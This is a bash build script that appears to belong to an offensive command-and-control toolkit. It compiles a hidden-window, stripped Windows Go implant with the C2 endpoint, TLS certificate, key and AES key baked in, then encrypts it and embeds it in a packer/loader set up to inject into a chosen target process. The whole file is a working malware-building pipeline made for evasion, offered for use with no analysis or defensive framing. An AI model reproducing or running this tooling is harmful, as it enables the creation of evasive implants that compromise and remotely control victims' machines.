#!/bin/bash
set -e

C2=$1
WAITSEC=$2
CERT=$3
KEY=$4
AESKEY=$5
X1=$6 
X2=$7
UUID=$8
PACKER=$9
OUTFILE=${10}
INJECT=${11}

LDFLAGS_KARMA=(
    "-X 'main.InitC2Endpoint=${C2}'"
    "-X 'main.InitWaitSeconds=${WAITSEC}'"
    "-X 'main.InitUUID=${UUID}'"
    "-X 'main.certData=${CERT}'"
    "-X 'main.keyData=${KEY}'"
    "-X 'main.InitAESKey=${AESKEY}'"
    "-X 'main.X1=${X1}'"
    "-X 'main.X2=${X2}'"    
    "-X 'main.InitPFile=${PACKER}'"
    "-H=windowsgui"
    "-s"
    "-w"
)

LDFLAGS_KARL=(
    "-X 'main.aeskey=${AESKEY}'"
    "-X 'main.X1=${X1}'"
    "-X 'main.X2=${X2}'"
    "-X 'main.Target=${INJECT}'"
    "-H=windowsgui"
    "-s"
    "-w"
)

OLDDIR=$PWD

if [ ! -z "$OUTFILE" ]; then
    LOCATION=$OUTFILE
    OUTFILE="-o $OUTFILE"
fi

cd $(dirname $0)/../karl-portable
GOOS=windows GOARCH=amd64 go build -ldflags="${LDFLAGS_KARL[*]}" -o karl_port.exe

mv karl_port.exe $(dirname $0)
cd $(dirname $0)

GOOS=windows GOARCH=amd64 go build -ldflags="${LDFLAGS_KARMA[*]}" -o karma.exe
rm karl_port.exe

mv karma.exe ../karl && cd ../karl

# Encrypt karma binary before packing into karl
$HOME/.kbin/krypto karma.exe $AESKEY $X1 $X2

# Encrypted binary is embedded as byte array during compilation
GOOS=windows GOARCH=amd64 go build -ldflags="${LDFLAGS_KARL[*]}" $OUTFILE
rm karma.exe

if [ -z $OUTFILE ]; then
    OUTFILE=karl.exe
fi

if [ ! -z $LOCATION ]; then
    if [ "$(dirname $LOCATION)" == "." ]; then
        OUTFILE=$LOCATION
    fi
fi

if [ "$OUTFILE" == "karl.exe" ] || [ "$OUTFILE" == "$LOCATION" ]; then
    mkdir -p $OLDDIR/bin 2>/dev/null
    mv $OUTFILE $OLDDIR/bin
    LOCATION=$OLDDIR/bin/$OUTFILE
fi

cd $OLDDIR

echo "saved to $LOCATION"